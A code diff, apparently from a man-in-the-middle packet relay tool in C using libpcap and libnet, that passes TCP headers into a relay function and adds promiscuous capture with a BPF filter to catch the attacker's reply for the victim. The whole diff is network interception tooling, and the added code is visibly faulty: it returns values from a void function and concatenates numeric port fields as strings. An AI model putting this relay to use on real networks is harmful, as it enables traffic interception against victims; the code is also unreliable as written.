@@ -70,7 +70,7 @@ u_int8_t *v_mac;
 u_int8_t *r_mac;
 libnet_t *ln_context;
 char dev[32];
-void relay_IP(const struct sniff_ethernet *ethernet, const struct sniff_ip *ip, const u_char *payload, u_int32_t payload_s){
+void relay_IP(const struct sniff_ethernet *ethernet, const struct sniff_ip *ip, const struct sniff_tcp *tcp, const u_char *payload, u_int32_t payload_s){
 	// Send packet from relayer to attacker
 	printf("Sending packet from relayer to attacker\n");
 	// Construct IP header
@@ -101,7 +101,36 @@ void relay_IP(const struct sniff_ethernet *ethernet, const struct sniff_ip *ip, 
     		fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(ln_context));
 	
 	// Receive response from attacker to relayer
+	/* Open the session in promiscuous mode */
+	struct bpf_program fp;		/* The compiled filter */
+	char filter_exp[256];	/* The filter expression */
+	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+	if (handle == NULL) {
+		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
+		return(2);
+	}
+	/* Compile and apply the filter */
+	strcpy(filter_exp, "dst host ");
+	strcat(filter_exp, r_ip);
+	strcat(filter_exp, " and src host ");
+	strcat(filter_exp, inet_ntoa(ip->ip_src));
+	strcat(filter_exp, " and dst port ");
+	strcat(filter_exp, tcp->th_sport);
+	strcat(filter_exp, " and src port ");
+	strcat(filter_exp, tcp->th_dport);
+	printf("Filter string: %s\n", filter_exp);
+	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
+		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
+		return(2);
+	}
 	
+	if (pcap_setfilter(handle, &fp) == -1) {
+		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
+		return(2);
+	}
+	struct pcap_pkthdr header;	/* The header that pcap gives us */
+	/* Grab a packet */
+	packet = pcap_next(handle, &header);
 	// Send response from victim to attacker
 	
 }
@@ -172,7 +201,7 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
         printf("Ethernet type hex:%x dec:%d is an IP packet\n",
                 ntohs(eptr->ether_type),
                 ntohs(eptr->ether_type));
-	relay_IP(ethernet, ip, ip_payload, ip_payload_s);
+	relay_IP(ethernet, ip, tcp, ip_payload, ip_payload_s);
     	}else  if (ntohs (eptr->ether_type) == ETHERTYPE_ARP)
     	{
         printf("Ethernet type hex:%x dec:%d is an ARP packet\n",
